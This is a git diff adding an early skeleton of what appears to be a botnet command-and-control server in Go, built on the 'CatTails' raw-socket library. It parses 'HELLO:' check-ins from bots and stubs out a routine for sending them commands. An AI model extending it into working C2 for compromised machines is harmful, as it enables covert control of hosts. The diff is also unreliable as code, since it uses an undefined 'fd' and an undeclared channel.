@@ -1,10 +1,45 @@
 package main
 
 import (
+	"net"
+	"strconv"
+	"strings"
+
+	"github.com/google/gopacket"
 	"github.com/oneNutW0nder/CatTails/cattails"
 	"golang.org/x/net/bpf"
 	"golang.org/x/sys/unix"
 )
+
+// sendCommand takes
+func sendCommand(fd int, iface *net.Interface, src net.IP, listen chan string) {
+
+	// Forever loop to respond to bots
+	for {
+
+	}
+}
+
+// ProcessPacket TODO:
+func processPacket(packet gopacket.Packet, listen chan string) {
+
+	data := string(packet.ApplicationLayer().Payload())
+
+	payload := strings.Split(data, " ")
+
+	// Get the type of message
+	typeOfMessage := payload[0]
+
+	if typeOfMessage == "HELLO:" {
+		id, err := strconv.Atoi(payload[1])
+		checkEr(err)
+		hostname := payload[2]
+		mac := payload[3]
+		ip := payload[4]
+	} else {
+		return
+	}
+}
 
 func main() {
 
@@ -32,15 +67,26 @@ func main() {
 	}
 
 	vm := cattails.CreateBPFVM(filterRaw)
-	fd := cattails.NewSocket()
-	defer unix.Close(fd)
+
+	readfd := cattails.NewSocket()
+	sendfd := cattails.NewSocket()
+	defer unix.Close(readfd)
+	defer unix.Close(sendfd)
+
+	// Make channel
+	listen = make(chan string)
+
+	// Iface and src ip for the sendcommand func to use
+	iface, src := cattails.GetOutwardIface("8.8.8.8")
+
+	// Spawn routine to listen for responses
+	go sendCommand(fd, iface, src, listen)
 
 	for {
 		packet := cattails.ReadPacket(fd, vm)
 		// Yeet over to processing function
 		if packet != nil {
-			go cattails.ProcessPacket(packet)
+			go processPacket(packet, listen)
 		}
-		// syscall.Close(fd)
 	}
 }
